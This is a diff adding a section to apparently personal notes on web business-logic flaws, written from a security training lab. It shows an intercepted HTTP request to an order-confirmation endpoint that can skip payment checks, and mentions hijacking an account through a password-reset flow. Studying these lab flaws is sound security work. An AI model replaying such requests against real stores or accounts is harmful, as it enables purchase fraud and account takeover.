@@ -198,4 +198,23 @@ we have to manipulate specific parameters in the request or so to test for the b
  Chnage The username like username asif to change and add khan like forget password khan account
  
  
+  ## 7. Insufficient workflow validation
   
+  You Have 100$ your card okk first you buy a card 30$ product secand checkout the product https request intercept like 
+  
+  
+    GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
+    Host: 0a0600f60495fb95c0d611c500d6005b.web-security-academy.net
+Cookie: session=WXuC7ZOLgiqvNFVoVX5ZTkSkx0UHinhs
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a0600f60495fb95c0d611c500d6005b.web-security-academy.net/cart
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
